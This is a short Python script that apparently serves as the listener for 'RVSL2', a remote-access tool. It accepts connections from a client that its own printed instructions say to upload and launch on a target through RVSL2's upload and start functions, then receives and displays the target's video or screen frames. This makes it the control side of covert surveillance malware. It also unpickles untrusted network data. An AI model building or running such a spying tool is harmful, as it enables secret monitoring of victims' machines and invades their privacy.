import socket
import cv2
import pickle
import struct
import os
from colorama import Fore

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host_name  = socket.gethostname()
port = 8585
host_ip = input("(d)DNS/IP : ")
print('Infos //// IP/(d)DNS >', host_ip, 'PORT >', port, ' (8585 default)')
socket_address = (host_ip, port)

print(Fore.YELLOW + """
Upload the client via <upload> function of RVSL2 then launch it with <start> function.
Don't forget to modify the DNS PORT if necessary!
""" + Fore.WHITE)

server_socket.bind(socket_address)
server_socket.listen(5)
print("[*] Waiting for incoming connections...", socket_address)

while True:
    client_socket, addr = server_socket.accept()
    print('GOT CONNECTION FROM:', addr)
    if client_socket:
        data = b""
        payload_size = struct.calcsize("Q")
        try:
            while True:
                while len(data) < payload_size:
                    packet = client_socket.recv(4 * 1024)
                    if not packet: break
                    data += packet
                packed_msg_size = data[:payload_size]
                data = data[payload_size:]
                msg_size = struct.unpack("Q", packed_msg_size)[0]

                while len(data) < msg_size:
                    data += client_socket.recv(4 * 1024)
                frame_data = data[:msg_size]
                data = data[msg_size:]
                frame = pickle.loads(frame_data)
                # Resize frame to 1200x400 pixels
                frame = cv2.resize(frame, (1400, 840))
                # Display frame in video window
                cv2.imshow(f"RVSL2 {os.getlogin()} @ {socket.gethostname()} ({addr[0]})", frame)
                key = cv2.waitKey(1) & 0xFF
                if key == ord('q'):
                    client_socket.close()
        except KeyboardInterrupt:
            print("Interrupted by user, shutting down.")
            client_socket.close()
            break

client_socket.close()
